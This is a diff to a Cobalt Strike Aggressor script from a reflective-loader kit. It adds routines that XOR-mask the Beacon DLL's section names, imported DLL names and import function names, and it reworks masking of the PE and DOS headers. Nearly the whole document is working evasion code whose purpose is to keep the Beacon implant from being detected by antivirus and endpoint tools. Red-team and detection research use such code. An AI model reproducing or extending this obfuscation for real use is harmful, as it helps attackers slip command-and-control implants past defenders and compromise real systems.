@@ -1,8 +1,359 @@
 # User Defined Reflective Loader Kit Aggressor Script
+global('$temp_dll');
+
+# 'case insensitive sort' from sleep manual...
+sub caseInsensitiveCompare {
+    $a = lc($1);
+    $b = lc($2);
+    return $a cmp $b;
+}
+
+sub printBytesAt{
+	local('@Bytes');
+	local('$Offset $size $beacon_dll $index $Byte $x');
+	$beacon_dll = $1;
+	$Offset     = $2;
+	$size       = $3;
+	for ($x = 0; $x < $size; $x++) {
+		$index = $Offset;
+		$index += $x;
+		$Byte = byteAt($beacon_dll, $index);
+		@Bytes[$x] = uc(formatNumber($Byte, 16));
+	}
+	println("|_ bytes at offset $Offset: ".@Bytes);
+}
+
+
+sub my_dump_my_pe {
+    local('$out $key $val %pemap @sorted_keys');
+	$my_pe = $1;
+    %pemap = pedump($my_pe);
+    @sorted_keys = sort(&caseInsensitiveCompare, keys(%pemap));
+    foreach $key (@sorted_keys) {
+        $out = "$[50]key";
+        foreach $val (values(%pemap, @($key))) {
+            $out .= " $val";
+            println($out);
+        }
+    }
+}
 
 bind Ctrl+1 {
 	openWindowsExecutableStageDialog();
 }
+
+sub array2Int {
+    local('@cArray');
+    local('$cVal');
+    local('$cIndex');
+
+    $cVal = 0;
+
+    if ((size(@_) == 1) && (size($1) == 4)) { 
+        @cArray = reverse($1);
+        
+        foreach $cIndex (@cArray) {
+            $cVal = ($cVal << 8) + ($cIndex & 0xFF);
+        }
+        return $cVal;
+    }
+}
+
+sub getStringFromOffset {
+	local('$beacon_dll $Offset $indexer $byte $y $tString');
+	local('@chars');
+
+	$beacon_dll = $1;
+	$Offset     = $2;
+
+	$y = 0;
+	while (true){
+		$indexer = $Offset;
+		$indexer += $y;
+		$byte = byteAt($beacon_dll, $indexer);
+		if ($byte == 0){
+			break;
+		}
+		@chars[$y] = chr($byte);
+		$y++;
+	} 
+	$tString = join("",@chars);
+	return $tString;
+}
+
+sub boku_pe_mask_ImportDLLNames {
+	local('%pemap');
+	local('@import0A @import1A @import2A @import3A');
+    local('$import0 $import1 $import2 $import3');
+    local('$import0strlen $import1strlen $import2strlen $import3strlen');
+    local('$import0str $import1str $import2str $import3str');
+	local('$beacon_dll $xorKey $rdataRaw $rdataVA $rdataDiff ');
+	local('@rdataRawA @rdataVAA');
+	$beacon_dll = $1;
+	$xorKey     = $2;
+	%pemap = pedump($beacon_dll);
+
+	println("[+] Masking Import DLL Names with single byte XOR key 0x".uc(formatNumber($xorKey, 16)));
+
+	@rdataRawA     = values(%pemap, @(".rdata.PointerToRawData.<value>"));
+	$rdataRaw      = @rdataRawA[0];
+	@rdataVAA      = values(%pemap, @(".rdata.VirtualAddress.<value>"));
+	$rdataVA       = @rdataVAA[0];
+	$rdataDiff     = $rdataVA - $rdataRaw;
+
+	@import0A      = values(%pemap, @("Import.0.RVAModuleName.<value>"));
+	$import0       = @import0A[0];
+	$import0      -= $rdataDiff;
+	$import0str    = getStringFromOffset($beacon_dll, $import0);
+	$import0strlen = strlen($import0str);
+
+	@import1A      = values(%pemap, @("Import.1.RVAModuleName.<value>"));
+	$import1       = @import1A[0];
+	$import1      -= $rdataDiff;
+	$import1str    = getStringFromOffset($beacon_dll, $import1);
+	$import1strlen = strlen($import1str);
+
+	@import2A      = values(%pemap, @("Import.2.RVAModuleName.<value>"));
+	$import2       = @import2A[0];
+	$import2      -= $rdataDiff;
+	$import2str    = getStringFromOffset($beacon_dll, $import2);
+	$import2strlen = strlen($import2str);
+
+	@import3A      = values(%pemap, @("Import.3.RVAModuleName.<value>"));
+	$import3       = @import3A[0];
+	$import3      -= $rdataDiff;
+	$import3str    = getStringFromOffset($beacon_dll, $import3);
+	$import3strlen = strlen($import3str);
+
+
+	println("|_ Plaintext DLL Import Names:  $import0str $import1str $import2str $import3str $import4str");
+
+	$beacon_dll = pe_mask($beacon_dll, $import0, $import0strlen, $xorKey);
+	$beacon_dll = pe_mask($beacon_dll, $import1, $import1strlen, $xorKey);
+	$beacon_dll = pe_mask($beacon_dll, $import2, $import2strlen, $xorKey);
+	$beacon_dll = pe_mask($beacon_dll, $import3, $import3strlen, $xorKey);
+
+	$import0str    = getStringFromOffset($beacon_dll, $import0);
+	$import1str    = getStringFromOffset($beacon_dll, $import1);
+	$import2str    = getStringFromOffset($beacon_dll, $import2);
+	$import3str    = getStringFromOffset($beacon_dll, $import3);
+
+	println("|_ XOR Masked DLL Import Names: $import0str $import1str $import2str $import3str $import4str");
+
+    return $beacon_dll;	
+}
+
+
+sub boku_pe_mask_SectionNames {
+	local('%pemap');
+	local('@section0A @section1A @section2A @section3A @section4A');
+    local('$section0 $section1 $section2 $section3 $section4');
+    local('$section0strlen $section1strlen $section2strlen $section3strlen $section4strlen');
+    local('$section0str $section1str $section2str $section3str $section4str');
+	$beacon_dll = $1;
+	$xorKey     = $2;
+	%pemap = pedump($beacon_dll);
+
+	println("[+] Masking Section Names with single byte XOR key 0x".uc(formatNumber($xorKey, 16)));
+
+	@section0A    = values(%pemap, @("Sections.AddressOfName.0.<location>"));
+	$section0      = @section0A[0];
+	$section0str    = getStringFromOffset($beacon_dll, $section0);
+	$section0strlen = strlen($section0str);
+
+	@section1A    = values(%pemap, @("Sections.AddressOfName.1.<location>"));
+	$section1      = @section1A[0];
+	$section1str    = getStringFromOffset($beacon_dll, $section1);
+	$section1strlen = strlen($section1str);
+
+	@section2A      = values(%pemap, @("Sections.AddressOfName.2.<location>"));
+	$section2       = @section2A[0];
+	$section2str    = getStringFromOffset($beacon_dll, $section2);
+	$section2strlen = strlen($section2str);
+
+	@section3A    = values(%pemap, @("Sections.AddressOfName.3.<location>"));
+	$section3      = @section3A[0];
+	$section3str    = getStringFromOffset($beacon_dll, $section3);
+	$section3strlen = strlen($section3str);
+
+	@section4A      = values(%pemap, @("Sections.AddressOfName.4.<location>"));
+	$section4       = @section4A[0];
+	$section4str    = getStringFromOffset($beacon_dll, $section4);
+	$section4strlen = strlen($section4str);
+
+	println("|_ Plaintext Sections:  $section0str $section1str $section2str $section3str $section4str");
+
+	$beacon_dll = pe_mask($beacon_dll, $section0, $section0strlen, $xorKey);
+	$beacon_dll = pe_mask($beacon_dll, $section1, $section1strlen, $xorKey);
+	$beacon_dll = pe_mask($beacon_dll, $section2, $section2strlen, $xorKey);
+	$beacon_dll = pe_mask($beacon_dll, $section3, $section3strlen, $xorKey);
+	$beacon_dll = pe_mask($beacon_dll, $section4, $section4strlen, $xorKey);
+
+	$section0str    = getStringFromOffset($beacon_dll, $section0);
+	$section1str    = getStringFromOffset($beacon_dll, $section1);
+	$section2str    = getStringFromOffset($beacon_dll, $section2);
+	$section3str    = getStringFromOffset($beacon_dll, $section3);
+	$section4str    = getStringFromOffset($beacon_dll, $section4);
+
+	println("|_ XOR Masked Sections: $section0str $section1str $section2str $section3str $section4str");
+
+    return $beacon_dll;	
+}
+
+# Obfuscate all the Import Address Table Name Entry Strings with XOR 
+sub xor_ImportEntryNames {
+    local('@EntryThunkRVABytes @EntryNameBytes @zero');
+    local('%pemap');
+    local('$EntryThunkRVA $key $NameEntryRVA $EntryName $maskkey $EntryIndexOffset $EntryThunkRVAOffset $EndOfImports');
+    local('$nullCheck $out $OrdinalCheck $thisByte $FirstThunk_RAW $xEntryNameOffset $NameString');
+    local('$StringSize $rdataRaw $rdataVA $rdataDiff $EntryNameOffsetNull');
+    local('$beacon_dll $xorKey');
+	 
+    $beacon_dll = $1;
+    $FirstThunk_RAW = $2;
+    $dataDiff   = $3;
+    $rdataDiff  = $4;
+    $xorKey     = $5;
+
+    #println("FirstThunk: $FirstThunk");
+    # -0x1400 from the VA to get the offset in the file for the import table
+    $FirstThunk_RAW -= $rdataDiff; 
+    $EntryThunkRVA = $FirstThunk_RAW;
+	#println("Original First Thunk RAW Offset : ".uc(formatNumber($FirstThunk_RAW, 16)));
+    $i = 0;
+    $EndOfImports = 1;
+    $nullCheck = 0;
+    @zero = @(0);
+	
+    while (1){
+        $OrdinalCheck = 0;
+        $EntryIndexOffset = 0;
+        $EntryThunkRVA = 0;
+        $EntryThunkRVAOffset = 0;
+        @EntryThunkRVABytes  = @(0,0,0,0,0,0,0,0);
+        $thisByte = 0;
+
+        $EntryIndexOffset = $i * 8;
+        $EntryThunkRVA = $FirstThunk_RAW + $EntryIndexOffset;
+        #println("EntryThunk RVA : ".uc(formatNumber($EntryThunkRVA, 16)));
+
+        # Get the 8 bytes which hold the RVA to the Import Name string
+		#printBytesAt($beacon_dll, $EntryThunkRVA, 8);
+        for ($x = 0; $x < 8; $x++) {
+            $EntryThunkRVAOffset = $EntryThunkRVA;
+            $EntryThunkRVAOffset += $x;
+            $thisByte = byteAt($beacon_dll, $EntryThunkRVAOffset);
+            @EntryThunkRVABytes[$x] = $thisByte;
+        }
+
+        # Check if the entry is an Ordinal 
+        $OrdinalCheck = pop(@EntryThunkRVABytes);
+        #println("OrdinalCheck : ".$OrdinalCheck);
+
+        # Shrink the array down to 4 entries
+        @EntryThunkRVABytes = sublist(@EntryThunkRVABytes, 0, 4);
+
+        # Convert the array into an integer
+        $NameEntryRVA = array2Int(@EntryThunkRVABytes);
+
+		$xNameEntryRVA = 0;
+		$xNameEntryRVA = formatNumber($NameEntryRVA, 16);
+		$xNameEntryRVA = uc($xNameEntryRVA);
+	
+		# Last import entry for DLL will be 8 zeros. If found, exit the loop
+		if ($NameEntryRVA == 0){
+			break;
+		}
+
+		$xEntryNameOffset = 0;
+		$NameString = 0;
+		# Only do string XORing for Imports that have Name strings
+		if ($OrdinalCheck == 0){
+
+			$EntryNameOffset = $NameEntryRVA - $rdataDiff; 
+			$EntryNameOffset += 2;
+
+			$xEntryNameOffset = formatNumber($EntryNameOffset, 16);
+			$xEntryNameOffset = uc($xEntryNameOffset);
+
+			$NameString = getStringFromOffset($beacon_dll, $EntryNameOffset);
+
+			# XOR the DLL import name
+			#$beacon_dll = pe_mask_string($beacon_dll, $EntryNameOffset, $xorKey);
+
+			# pe_mask_string XORs the null string terminator byte which can causes an error in UDRL
+			$StringSize = strlen($NameString);
+			#println("|_ Entry Name Null byte position: 0x".formatNumber($EntryNameOffsetNull, 16));
+
+			$beacon_dll = pe_mask($beacon_dll, $EntryNameOffset, $StringSize, $xorKey);
+			#println("|_ $xNameEntryRVA   $xEntryNameOffset   $NameString");
+
+		}
+		$i++;
+	}
+	return $beacon_dll;
+}
+
+
+# Mask the DLL Import Entry Names for beacon. Does not mask Ordinal Entries.
+sub boku_pe_mask_ImportNames {
+	local('%pemap');
+	local('$temp_beacon_dll $xorKey $rdataRaw $rdataVA $rdataDiff $dataRaw $dataVA $dataDiff $K32_OFT_RVA $ADVAPI32_OFT_RVA $WININET_OFT_RVA $WS2_32_OFT_RVA');
+	local('@rdataRawA @rdataVAA @dataRawA @dataVAA @K32_VA_A @ADVAPI32_VA_A @WININET_VA_A @WS232_VA_A');
+
+	$temp_beacon_dll = $1;
+	$xorKey     = $2;
+
+	%pemap = pedump($temp_beacon_dll);
+
+	@rdataRawA = values(%pemap, @(".rdata.PointerToRawData.<value>"));
+	$rdataRaw  = @rdataRawA[0];
+
+	@rdataVAA  = values(%pemap, @(".rdata.VirtualAddress.<value>"));
+	$rdataVA   = @rdataVAA[0];
+
+	$rdataDiff = $rdataVA - $rdataRaw;
+
+	@dataRawA = values(%pemap, @(".data.PointerToRawData.<value>"));
+	$dataRaw  = @dataRawA[0];
+
+	@dataVAA  = values(%pemap, @(".data.VirtualAddress.<value>"));
+	$dataVA   = @dataVAA[0];
+
+	$dataDiff = $dataVA - $dataRaw;
+
+	println("Section   |     RAW Offset     | Virtual Address    | Raw Vs VA Difference");
+	println("--------------------------------------------------------------------------");
+	println("RDATA     |      0x".uc(formatNumber($rdataRaw, 16))."              0x".uc(formatNumber($rdataVA, 16))."               0x".uc(formatNumber($rdataDiff, 16))); 
+	println("DATA      |      0x".uc(formatNumber($dataRaw, 16))."              0x".uc(formatNumber($dataVA, 16))."               0x".uc(formatNumber($dataDiff, 16))); 
+
+	println("[+] XOR Masking Import Entry Name Strings");
+	
+	# Find the offsets to the import table DLL entries
+	@K32_VA_A      = values(%pemap, @("Import.0.RVAFunctionNameList.<value>"));
+	$K32_OFT_RVA   = @K32_VA_A[0];
+	@ADVAPI32_VA_A = values(%pemap, @("Import.1.RVAFunctionNameList.<value>"));
+	$ADVAPI32_OFT_RVA   = @ADVAPI32_VA_A[0];
+	@WININET_VA_A  = values(%pemap, @("Import.2.RVAFunctionNameList.<value>"));
+	$WININET_OFT_RVA    = @WININET_VA_A[0];
+	@WS232_VA_A    = values(%pemap, @("Import.3.RVAFunctionNameList.<value>"));
+	$WS232_OFT_RVA      = @WS232_VA_A[0];
+
+	println("DLL       |     Original First Thunk RVA  ");
+	println("----------------------------");
+	println("Kernel32  |      0x".uc(formatNumber($K32_OFT_RVA, 16)));
+	println("Advapi    |      0x".uc(formatNumber($ADVAPI32_OFT_RVA, 16)));
+	println("Wininet   |      0x".uc(formatNumber($WININET_OFT_RVA, 16)));
+	println("ws2_32    |      0x".uc(formatNumber($WS232_OFT_RVA, 16)));
+	# Obfuscate the import entry names with the XOR key
+ 	$temp_beacon_dll    = xor_ImportEntryNames($temp_beacon_dll, $K32_OFT_RVA, $dataDiff, $rdataDiff, $xorKey);
+ 	$temp_beacon_dll    = xor_ImportEntryNames($temp_beacon_dll, $ADVAPI32_OFT_RVA, $dataDiff, $rdataDiff, $xorKey);
+ 	$temp_beacon_dll    = xor_ImportEntryNames($temp_beacon_dll, $WININET_OFT_RVA, $dataDiff, $rdataDiff, $xorKey);
+	$temp_beacon_dll    = xor_ImportEntryNames($temp_beacon_dll, $WS232_OFT_RVA, $dataDiff, $rdataDiff, $xorKey);
+
+    return $temp_beacon_dll;	
+}
+
 
 sub setEgg{
 	local('@Bytes');
@@ -48,25 +399,25 @@ sub setNops{
 
 sub boku_pe_mask{
 	local('$maskkey');
-    $temp_dll = $1;
+    $boku_pe_dll = $1;
     $maskkey = 123;
 	# CS RDI Code push r10; pop r10; MZAR - Make it NOPNOPNOPNOP
-    $temp_dll = setNops($temp_dll, 0x00);
-    $temp_dll = setNops($temp_dll, 0x02);
+    $boku_pe_dll = setNops($boku_pe_dll, 0x00);
+    $boku_pe_dll = setNops($boku_pe_dll, 0x02);
 	# Removing before 0x32 messes with the SRDI + Cant remove 0x3C-0x3D (offset to newExeHeader)
-    $temp_dll = pe_mask($temp_dll, 0x33, 0x8, $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x33, 0x8, $maskkey);
     # Remove DOS header string
-    $temp_dll = pe_mask($temp_dll, 0x4D, 0x02, $maskkey);
-    $temp_dll = pe_mask($temp_dll, 0x58, 32,   $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x4D, 0x02, $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x58, 32,   $maskkey);
 	# PE Header
-    $temp_dll = pe_mask($temp_dll, 0x80, 0x4,  $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x80, 0x4,  $maskkey);
     # Other Header Masking
-    $temp_dll = pe_mask($temp_dll, 0x84, 0x2,  $maskkey);
-    $temp_dll = pe_mask($temp_dll, 0x88, 0xB,  $maskkey);
-    $temp_dll = pe_mask($temp_dll, 0x96, 0x6,  $maskkey);
-    $temp_dll = pe_mask($temp_dll, 0xBC, 0x13, $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x84, 0x2,  $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x88, 0xB,  $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x96, 0x6,  $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0xBC, 0x13, $maskkey);
 
-    return $temp_dll;
+    return $boku_pe_dll;
 }
 
 sub prependBytes{
@@ -143,9 +494,17 @@ sub generate_my_dll {
 	println("|__ prepend: ".$prepend);
 	println("|__ allocator: ".$allocator);
 	println("|__ magic_mz: ".$magic_mz);
-	println("|__ smartinject: ".$smartinject);
+	println("[+] Beacon DLL size: 0x".uc(formatNumber(strlen($temp_dll), 16)));
+	if ($obfuscate eq "true") {
+		$xorKey = 0xC3;
+		println("[+] Obfuscating section names, DLL import names, and DLL import entry names with XOR key: ".uc(formatNumber($xorKey, 16)));
+		$temp_dll = boku_pe_mask_ImportNames($temp_dll, $xorKey);
+		$temp_dll = boku_pe_mask_ImportDLLNames($temp_dll, $xorKey);
+		$temp_dll = boku_pe_mask_SectionNames($temp_dll, $xorKey);
+	} 
 	$temp_dll = setup_transformations($temp_dll,$3);
 	$temp_dll = setup_strings($temp_dll);
+
 #	$temp_dll = setEgg($temp_dll);
 	$temp_dll = boku_pe_mask($temp_dll);
 	$temp_dll = boku_strrep($temp_dll);
